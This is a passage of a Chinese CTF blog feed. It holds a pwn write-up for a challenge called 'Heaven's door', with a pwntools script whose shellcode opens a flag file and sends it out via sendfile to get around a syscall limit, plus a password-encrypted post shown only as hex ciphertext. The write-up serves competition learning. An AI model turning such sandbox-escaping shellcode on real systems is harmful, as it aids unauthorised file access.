id="Heaven’s-door"><a href="#Heaven’s-door" class="headerlink" title="Heaven’s+door"></a>Heaven’s+door</h1><p>限制了syscall的shellcode，只能两次syscall调用</p><p>不用绕过也可以，sendfile</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span><span class="token operator">*</span><span class="token comment">#from LibcSearcher import LibcSearcher</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token punctuation">)</span><span class="token comment">#pause()</span><span class="token comment">#------------------------------------------------------------------</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>ch<span class="token punctuation">)</span><span class="token punctuation">:</span>dbg<span class="token punctuation">(</span><span class="token string">'b *0x0000000000401709\n'</span><span class="token punctuation">)</span>bss<span class="token operator">=</span><span class="token number">0x404000</span><span class="token operator">+</span><span class="token number">0x400</span>shellcode<span class="token operator">=</span>asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>shellcode<span class="token operator">+=</span>asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sendfile<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">)</span>s<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>bits<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"splitw"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">,</span><span class="token string">"-l 150"</span><span class="token punctuation">]</span>binary<span class="token operator">=</span><span class="token string">'./pwn'</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>s  <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num      <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es   <span class="token operator">=</span> <span class="token keyword">lambda</span> data       <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pwn<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x66</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="babytrace"><a href="#babytrace" class="headerlink" title="babytrace"></a>babytrace</h1><blockquote><p>3解题</p></blockquote><p>沙箱绕不过去，等复现</p>]]></content>
      
      
      <categories>
          
          <category> CTFpwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 赛题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Easy W-EscapeTwo-S7</title>
      <link href="/2025/01/16/11.%20Easy%20W-EscapeTwo-S7%E6%8E%92%E4%BD%8D%E8%B5%9B/"/>
      <url>/2025/01/16/11.%20Easy%20W-EscapeTwo-S7%E6%8E%92%E4%BD%8D%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="33ca70b11f61a921bca5c4c3085c524c5744884cc5418969fd7a333e90bf7406">2239f6ef2369263b61ef594c41be1d816fad778410c7e2868e602c2e7312124b3fa283e45557055fda2e90d0ff6c652da5155db84dea56c94bdbd262515dadd3f56e81b7585b9e28af6e506eaf2835e00a8027d5e89346d72097813de9296cd0e4a9509fecfa9c62230024a74ca981f79e4df733b73bfc1de609e3753b4f1743b8eb6f839cce0b3049767315d6e0b8dd28c1ae76cf6b322f53884b03222f3ca4f1d58df0536aeaf1ab53d3eb4a55c0fc3162dcaab5c3e98d6f3fa3448ea597756b07c98171f729e9a65ae54eff6b4ffbbcd21844eb796501453393d5c904f697e24c8a1e05d1b178185cfe29360ae81cd32f9d8354ef0912aacfbcc7f85edfa342f3b2211009bdde840c7fd3a959a1e258da437c9158e7f3db90d0af9e2dc826e8a5d08a6db4a33d6cea7b1269519981a21ba33bfd2974f7c6c699d743d7c925293d647214476da823569ab7fd322307a1f0fd1a52b660b680ffbe6536de14012e4dd76ff6f233a2781c9b79148b97d4eb21c79cd70dc4f50b8df212e49df6b6fa505d5d305efb240bcbb4adb89aff2e2a93c820d249ab9d895454aa05be7f5691373613ba6d9192bf9ef476f2878c3ef2f467cacb4f371b7750262467f114386a0cc56ea79465dc1581a0b736f4edafb08a5ea81886462a10ce812601505698da513858974f795abb6bd1a749b5475d28d398e81e532043a11b45cb2b79031f6b8f3507716dbca95b326d3a1e79486ac58fcd91d498ad1d473f305f594b70611ec7e4c084be0520c99b3b9656609f6dd0b60733763da7917f6f53a4a193b118a83fd44af48ee9b39ff7cef9f7451ffe4626c4b0bf093922ea60743918e34d83c7f3b30f13afcd6d1df4ac087a552b9b96aac22867f99c04b9df02e18f21e083fe466e031506dfb97bee77eaf539b1391cb6ae5683a1f0e25cba54441beb05d3168203fe392ad5e17cfe388f2fe1623a50bb21228d4bdf8b889a521e61474331df42d76044ca5fd780871320c49dad9111380f611da2e422e62a08894bb54dce27f6abb1586a11dd8dbd92e9118622a5991c4daca7643d3b3759f36b093ad154fba932e9de95ae0647d34fbd5ce66be30cb02a4f1b4218e9f9da0fb1366d4096d96ce64e07e4757ff32e7c0f6d89faaab02d3ee54f3aeac9285a06a64c72f777c1621202906fe4861900e7808756b15f6533d925691a8e3b52e5054be933447f77f5192aefb02c81b6cd962f2bb212e5bde1deae65e58212aebdf6cccba5919c8e9654ae4776488f216eb588ece16f06afe13720325912395f34050adfe5690ae96ec6a4f1829539c4c876ab1ee82d2947ba5e2da7fab199d6add344d9a2dc6fd33f4597e5c0dbaff319212b51f63dc5b754f8069b4d55bb40e6156ce4c846b91fbbfcebff4859c7865e7d2af559a07be75a3df272f048893e2747378c01fb1b634715a3a671a0c9d96cdea362134715e80e45f2574d85040f3886038af8d76a28a0dbdc532bee6d741a72fa11dae60b9c3e995eecd1ea98f2944065e0216c18dc1fed59e494b963f43ce8ed8104f757fa18b3b425b0e5575c56548be0c97d45c624399c021a7028035d68112203261b5377e684c25856f1439ecc4b3ef9af4740a7a009acc03bf5c678db1aa5c970a0842ecfd30e3b21ff2329f9e8ced72d589f5b32c1cfc34e6866fb48c73cebcf69e84bdb92aa5d807d43c260458005f50db96f437d1132c3e0c3f8d9c576da98c5233c88971534f1335ecb3532a2e3ea03d84198de31e1c3dbfb59ae7c38e3b669dc0d430c16305fcf411a73428cff339210936a317c78c6ce770eca3b1819e4b84c835af43f3e6fe3bd34aa305f745ee5356471b8f738adbe64110f8c7a35528dfe4ebbf0b64c2c0f72d9d80f04a9d2f6cb6e2754e739d318dda71b3c4301af0e9015f44e71ce73fd478a4a4fd7e49b7793d011502c8e013f6b9fe6b1319e6638a2f86cb230a0d0db75f814da5d1a66fe88e907d63442af84935f51c29f4b320b33e31c04d43704a47628b6d3ef5aeb515e66f3b49cc9cd70cacff9d40e4b41618154f891bdaaac8fda5e302c9b1ef495566325f086954d5c4db69d7fe0655866649b741764f1faffc90494dbb8b78e43125f27b4ceae0d834a0f56b38d13d8d42875980d481a95a7ad81af01fe6f60832d05e3b674119b24e98d12c9905492820f0e9ffe5f35b84496cd445b771ef43eaaa2b38d86057030f9cbc4070f9076f067f7389db1fb1a9a6c810dd914714e2088fc974e6e92b22f7d298d1b52ce35cf730f639924f834a2596ff28713b47abf7560a893ae55ae2bd557c05320324f346b2a5e44134adf6320c082ee2e600c6ffaef05d51708538c7b1f0de6b5d391f374dfda73bf609e643fb13183ee891b33770404342ac317bdcf5cf6fb9ef7526da05bb5b020a6b59a5677f85cce0297c471f0e4ace81edcd818ec9867b978fffa331051a25e75fd1e658e688f7c5a52526eba9e2ded01f1a6cf94ce2a9ff69db13179de81fb6b283033c5685803b36fba9d5c7284d70e3fc105122560c978ea4d4e0a665faef2bb21d2558f493907616dc12d1710009f604ba4b1ef0235fa4955bf4cf08529eaff13be8610ac2832375fc994bc55249b743532d863d0077cdb08ef6f8c05dc76064df0e1a9f8374e215fb9f14e3f65e34644fa4b0dacb1374bfe28e963b3a702715bbcfd917811a83a0a274d0d30118c297303237873ed9f45cfb17f1683883c19a30398a7f70e5160d972ff583c37e5ca3e9e3e1da3a131d2883f1a693351cee3ce47b65b18cd1ed9cd52225805f2b4da430fceceb7706ce65edb332b487237b456adee8a7fc37179e151ab0008d3a699a21831ff795b10558ab4a31d6e8d15575de3fea9f00470da7aa33c9ec8c9b74ac3a0dcd70e9a7c86b7e48cb1dbdbe9fc2c322028e692badba2b06427726dedc2ef344b762ca4bb6b66d9a8ca0e5926ef647d5c929e47d616f97b95c40e080c44375a9ed72bffe13ce65d873db102f86ea7a23ff01fa90946b0ed072a748c07d2428ec9be146eb89d64e03b847290744d0052ce99ef7c621c027f4bf028ef5cf03950285fb91f4d34d322a6da36b3396902eaf057e943dc6a31763b619d462ed5804873cdeab9894c5c6411425ec516bfd4bba55815456eda0dec47227a0bbaf05074a9146cf74c2d461e9df80658a52012f490110b95bbb7c16954c060f27cc9e8131d1d9ac77adc1f2ff80e5c4edf052995d89bc3ca6f8d50458c269f09eb7c79f1453c53b45f68a1ccb5d960d79173dcc5675211a2008c8987300a74ab873b50222f6ee05392b6869cc9e857367015c8415793d29925377804a8982eadc6fb5308b807b49ce644a68036c0e52350a041af4d051fb551a9c0a75b0c090c2f148daa5c5c24210ff1212806ccf52ffabbc591579897d04d0713dbb0a201b2bd6cb724f3bd55a568997ae81a33726dde64150843c76d369be7e558c09d671c0516759f12e5fa886cf70b3ce39860be3ee7da230cf55e69b68a2898caeadf5b5abd635a9b5ffb0ebddcaeb0c8126fad74ad531203892a4e37ffdf4d1f91293289bb1d30cc431ce5db7ed12ac06310c71aa02f8d9081863b4a8303cf4a9f84cf6a7391dc80965b9f1d7558afb0d22fa0c49e791738cdb25227e7c8175437fc94c72c9fadb209d5c6841551a4ae61793c4370f35d0477d600e887919f9bfce01b25dccc23cd4f8b0bca56faac5b48e3eae1f82f8231186601a1215eb5df2af37d29fd16415b839294ab89955599b0fb2a3af863a4b95cf2daaf3193538a379ad4f57b7cefdb3b78f1f80eb0ed43ec0bfbf6d171c568d6d62031d5271eebe1f6966defb9a2b4d76b02ed16cc338460e5d2f229f13e53468529a93a01c6dfe1c472fd48efea24ef9dc2df4a92b186605c63eb4ce7e3ec62f3a8cd637e334507d864eb57a4d6df87283e26c12315f9fd3eaddbb47ae11471dafca45880c1cebdb898956126f0010aeb5bbcdb51a11eac26532fabe26160d8b0a3fbbcf1d24b5238549055be3339376e7e503b288ad41e28122a8cb48310f01e5a5c6f4fbc99b2f0ac6a76e0741859c0737e67d5b199f9d929590e67a20d8dd1f18c8e3ea2e762d9a64c58229b11d1f8d59f41530512ec885d4874379d8719eb464bda24c9c346312231877f4355607c0f024c9701beb4910e2375c457d8d952fa4730dc282c079a33ee6a1fff4e903660f45d2b4cebe770018b22f7ba486661e8ff54cb795002c452575f556fac092bcfe550bc3f9ff45e55dd14b582e290bf631a79f9cdcec32e845fab4f67373ab0e2caac015063feedcc7f171ce943442a3c141232c1965e4bbd3aadb6942b4bc52997ac19a0bacff020ea723c6cb1f23b932755f7d6e8bcba50ae0264fc78becf261cfb9a13672ba46fc50a8d4131cb5b5c02c03dec1921599795a80ca009aa3409c5179a7f8e2c760cb2aada01ca396fffd09ee9e4f8e4bca8fa6e52413c13c68bf2bdb06b8606f276bbaddc4746df20f74a0bde0456b06113d822ff544fec5796c05f06adc06f476aee1a5f8166e7d67ddaaa4f00404d363c64efa1836bb947f6777d555123f330c508a2191a02ebebb1c6198cb0867845b4e67b906870c1559d6eb7dbcb259544f89fece63258c1aef401b19ba8f0894460083af494ed061fa6e18721064c8c7a6182b97d94080007748756e0a9d3057aa4449ed2f4560174a38ef5c450ef1e9785c938b4a20efc345bc2f5ff30bab74f5b77d5ebc7bab8ae9d5d235c1193842428c1b1b54be02c1b404c3c6dee6d5af7b5d6d8b25cc793ed5796662c3200b436bf2e7a23541a20d487c451323b69d38666e52f2170261ef32950882ac15d590fabef047abcbbed11d253506669976151f1e2b179db144165b257ecc75b1bec4283443d958fe95586b376239d5d62733544f27e8b0052becb655ff053f4b7f7d013156d9a0622a6db08ff3c8a1a7426634fc40213c8b0fca8eef30b9f2b371964f6b3d21129e92fcbb5676254e65ace95dab8701fd12b2807c26977c6a9a643f1146009dd8034e8e2e531d12d148816bf4659f11d61bca14ba2b8c9ba0fcc2ff1167529b5e974832ecbea74b2a0a2d3717d0f3b50371899fd9b715d6de2d5f14d88ffa4676be42b7ae6000fe6a18c4496fefed0af135654ee916d6d20d559422916ed2eebd03acd9519507fb98ebd19c10b4d10db26253d7ef7a7196f13246968b43ca12aac6e522f8208a9babd9487539a2c530b5f3c7956a924e7982230ebe4532fc285cf8e17da08c52826b763ea1e30a21fbb8f447b2564b95e174092e8cde58b2cf35ed120cef37524b87b99e19c1644bd5d31236a7f5a748551c56a86638cdb1b51bb1c04ee4a03bf4270ffd806540f756bbc62540f4a69316e93d95c5bbee7eab8e8df9d5feb6a78a1fd3133617fdf466a1f5802e31a6c2270fff9cc68d1b5f1384ecc646700d9ae590f4529c339ceba4c500c7d130a47b407d3f594335f49909efbd3a0525d127893076b3903efe3733977d564915691b52b8ce5e94fb6e97f42cef8385065ca8aa426cb30716c51ff93b362c7452648bb224f30662b6eea7fb78007664595a26bbce0f69c961ba89256ef18ffa59ac07c4f0984aaec584a92a4ba10909d64fafbfb0d59cf4d40a4e07ad21e17f9c7cffe110540adfc4361373098a83f7b2258ad6f63a07bc8cf49681356675570aa92cbaaa945c3fe259ae75d5ab4cbc1be7b3541142df6c36bc0f1837f45ec66e67a7570a4263611b798478d51e12ad22e443085d765f79486d6d60fe11b12af229c9a4e46094518724c83320cc8bbd9e1b492f71030d05027cfe46560e7fa4920224049e601a96eb653c430cb0e3d94cc8a8dc6ca30269f28737f2dd063ff5ab17db217e827e48308014acc4d0711d3d50bb3d111d038ba1c45a0369808a360525d5e44245f211db1bd0f99a73a7a0f0cc1919be09aa27ff4f671e0135fb0ff29ac3d52fa3c1296ccc81178aef55c99a198ccf57e068e16ddf43583670757e4a8372816bdec531331eb75ac021a63ffa2d57a9e85a5d168688e961dfc07f2491e76c19cce7319276f3766f15a33a481c8641da04c56c2ca833995774e34158979ca673e1c777d8ac4e1fd8486fd4bd1ef5a8157f93d1136a11b7c26dd4ae83028948b47ad61f62c945deb4182c8468efcdc41089e2b60a0e84444efb7a5dc10b36a28786a0d3f165ff1388f69e32c72e1daa3baa68f9c72380bc01ad07e2b3d02f83f6f94094044448a29f04cd3ffac4d987e74206284f4c257cd4b3999e69bd59eca0209da4ff3637cc55baa7b4c167bfb54b985ca54a8295ba556740df0adc3ac98a756dc468ea10be68403e2273039f517ea1956a90c07ee54a18ddfc50b264171c5da2a8c574be2f4a70be71d33047e9ba8c97a876b949257f44268fe87fabe0d18dd425d977b8d401c042cf4d84a2d99fb18dcdf6fdcaa99dd622d3e9cdb70ef634c36d8723d5d4c5dbdb083d5d0863ac9dada7386b0886f40b14fbc43d2f13e6b257bb22a890fec2c1b2eae9464283e44b2e7bf038ae5d783233527fdd84fb6f8e98c9efc0c8362703dd6427dc8d7ddb6c3091b5ca38ee8422645c77e4ee00bdb55603d1da06e6f4e15b061c551d1da2b818945c7ccf506724a634e5c55959d0bf5525377a27f718df61b2c08ca1173c68e77950c91551ff10a6ccfaf2901505794832c109eee8cf20bd48f74e31d021fc7b6cfa8ede1e85e6298c886189c2115f4651953598bd70a0dc86fa7f01cf0b80319f385b2f5185bba3981732f355606fdb3c6c801f06a0a4e4b59505ed65c9fa4c6d19567669074e719ae6026f2bb220e485fea9950807be5b2d63be1a2843bb1a1079b78295d33c335337b124e63aa9df5742f2769299a69a9f6e85961fc53f996cb2897f12f147ce3bbed4a7489a6911a60544816aa10a99f1bd70f207224698b5779d2e9ee03e5043e4ed74d0c7869029eaf54f1856e802cf54cb994ae2cd845cd5c4a78e825e5aea8d02d769c8db3464ba1deebd03e6a9643962c40f4bcb810f5d766ea54e6333f954edc37264622588023af0157d55034f9f61c482ec3b35138ded7ce7089ae3b7d265430450d3678dfbcb86fdc50e826f9e45a0685330244434b09dddcc2fef3dd4f51b5de2ce80942d3f938e0fbd23452344fe7f338d086482deb4fd4332dc405048b1ee72636c202efbdc6f2715ce50b751c572fccadee3822f2b67067c6ba418d17f6d68a5fa6bf9974dc549db10142e2446d44eaf3631df360f33c793d17c4c1e5e85956d1146f42cb7860ba28f3fae383116b81fe9752cdc4098db9a4d22a508529f21ade801ccfd012a18c7eeb421570ffc1b32eb33e3641c7c8b8d56b93392e1164e3028fbf5cc0f83c0a25b98788bcedfb247dbe1948b59b667bdbe011d551de659a6ef88e365a1060ee647b62bbf7c89e35c2f3d7837592b59f30d98ad3d119fa8022a10e5b26709f2aca5810e53f405fef3a30123c24d0a652a91894d6b3774eff37c4804724c34a4f4a01859aca3bf57e60493dd0a265b13d9474fde8994e85489b7b7a95f4e0692d3aeb4792b5eff68415aba52a915e89fff9e928d42fdafb2d9854e687b4a235808fcac344a89c6da2bc97d49541e0c36395831e1a6e5eae4c91589aec960ba61c86b08397674627619f02ac9f2b65754a65e677b43e91ec59d4864e51495b924c380a03091cc21a7eac4cf211d16831a39d4e4509d902be985690561a060e56c7536676c927067c03cbd4d8d2cc3714e93b89e3a2d03c1ebab68288711f4356f26a7379c47351f73e4b0a4604be619aa960bb27f6bbdbaeb035e3c8865ca67e33cc49d2e091198843d2126f6222d708d2098088b8ecdcc85ce673d6e52ad56ac087ca63f21124a9e3035beda3d445f022473eac793d838332ac493eef3ed073909a513acf8aaf344e0a604ee3a6c7f475f0a756d615e0747fc58dcdb88591629e6c10021c9d585723f650dc0ed8bb356a491dc7fb7393a2068c10872a957bd2097f9cb2df2323596653ed13305fe64600ec8a2dbff16cbbde0547ffb989d1d016085e0553525795f2fcb946f655556ac106ffa64b93eea50a8b69121965f4522c54b43a172a4728c7b3d977ab250653e898b72d073da6afe0561fe9badc86d111f8199d16a148dbb569d2be34524a8b3aeb4c03642573d450cd3d4a185a0e7e40bbb320a29b74a6a673c9cd5bcd79391e94a70c2e8f46034639bd4dcfe07bab0a8b16b75ca11287faa529c132819687a80eda2414696f19e2f4f48690325702202cfaf3f61dc3f1fc5091e02783ca1d0ddb5024dab9807df998bf4e13ae179d7c023b429aae94f42fcf9f04e88e7ab910376df4fcf2ec33aa8a47c64399f9b922e3ad669ce9fe16faba39eeda702e5686d8826338de3b1c12324828f4e0092fd7c036852f44ce3e29dfe4ce6a0cbf033d7f629a5d79bb4358547de57cc04e7445a82e1f6fa52531385a80ef30a48056d97dd45836179beba75863f2ec28412f3004afc7652b4aeac9fb8edf937bc814ea7fc03e2dd75a1d8a9c2497f8eba57fb96e84337742e5e36b25fd6b8347b04eec6fd069a6aeda15a217550a5978fa0a048fd9242087a6e5f57cdbdf1e3903f64ad58cd095458f356fcbebc355ddc133f91c52fb089fdd99b01c176b5bee9633898facce9d9439a946a743bf61f112143a638b5fab10034a60d47b8cd01305070ca9af92400b0ab930758f9f2ad85c2b731a5ab97fdfe773ba63c70a043c840f9f1459022c0ab9bcf280a42d9576b7077fd02e9d0e289dba4d96bbe89547a43bf2765ac23a5450c13103ea3690a97d769b8c16076e35c39c406ff6da4607f64ae16e2549a22679b82fd0ee28374f39c1d8b060170998cf097e87b08bf183a5e13ebf308b872f49e40bcb73fa3e0181d5aa6d69bee9848a3e3946d05076b5a73e5ceff0d9ba27daa47594fb1700ad8c508ea0f5b725954c8ea5f4c2a861553f5f75102fe60fe7fec3ac9a2ba5188b0cfdadb3ea6ea5449d1c589fe6711e48d7eebd600b08422ef49b6df98780ee79f16e8c1600b8851ab84b938ca3a03b58097a88523389e9dea61d9b0619b46aa12afd7bf50cf19fe5ea0a94f12cbf5e1857370b617ff1eba49dfad773a9eaa248eb980d928cf898b8ee4599e327653c7456e0ca5eee87ed267dbbeaa9f29fd9dd73a064a580e3798277f38a953819985489595ee1488da4fde0e2d28068336d3ad89241302a062817c735e541ec7f37a6ad4a3e9c54a15808432295b5a7acc94ee57d3eecc3bdeafa8c3f484003e218ee31b408bc7240b99b930acb378276b1ec0f763e1885bfc7dd86bb7b4ad008423d95739112ee3cf978230bd7ab4698f49ad73928b264a2c4aabf089dad12837354b2ee1f0c18fa5c35312a388b379584742402639f7e33a7c0de061bf3f9355ee2d7dbbed9037ec38a5452149901ac1798df1da5afe07a665a41982fc1583e13e67ff9bbd221d593d4d5508e546e8f73193743d2c20a7da39852798d242508e29524da9a1cdaf6050f017a764c3d3b930ff3549d4ea1ec16d20a42f7ea53f144876bcca298a98e1199a8b939b3b174a3e2b24eaae6736d0ab0854d389fccf367ea510c1ac79aa15549eed8b9b2a9a27e73a036245d4e1da6ed195470b2e21708139d6507e9baefe5bf46e8976e1be91f6d52fe5cd89d62385e0807f3ab2ebafa1f93942f56124128ddf496ec026b85ace2bdeb53dcea18ec2a68bb582bff27e7e279b74c902810a780827708c0e81451f9b5c947ebd1472dee06b82735a68dbd7bacbba3a4962fb2d0e158dd99613616c87fd19b468871a8062e90234f4f4841d591cd823c08879bbc08976323a9b4800f86c818799a14854a97d22bd7530d8637e237a9ed0ee0edbc1aeb570937b26ef470c40b226791cb80ab0684688b32df73c96c8c76520f9719191e06097f7a95e982a3f336bf8aa582e135d9f4068d0ca817b3239d6e8cf76ec9d0e0321621d0e2fecd43a11d280680095f4915e607a7a80a25731d4ca1aa56b493313eb0e45f670d23ea603e583514ca84a088733c101ff22b748733d4b2c6962ff000ac0ee8ea49f7d86e8f318ae39612daf673aaad756d4789260fae7e3915e89e3510992a1c950945aba3d9f19e271aab24300262a1672fdc2d47aa67bfb0591bad9cced8c371b7318260b36fc3582b8514fa3af9ef319402808abfaa3568855cf26fa886c7a267f8c77f10aefa8150fcb9b5bd2962c9e9053492f6a8737d6e330258415885a05dd5d91449c008f41c31a95908b200b84cd4b0e56feb16963b6fd87e43894a64b0456c3757df456236feffd8ae894914b1539f961a4d1454d02a40faf0af47e223c48b04850c2da665a905042f8a7f8e79cbf84c9cfe8f2c5dcdf94916ebcf8b61656e179883ec84476e0c6abec467beb4898210e1e7f3dc64a7c7863b60bc8f8c8dd23b623b133bac87a18b91c78cb7a5bd2baaf07e49a76f9c2ac1233a8aa3c263767b75e90407b3ce9eb45b80907f6d82f84de1cf8eff8527675e8ec8dc49886555a65d693032c00e1b2ac5d65c9a432abb19d0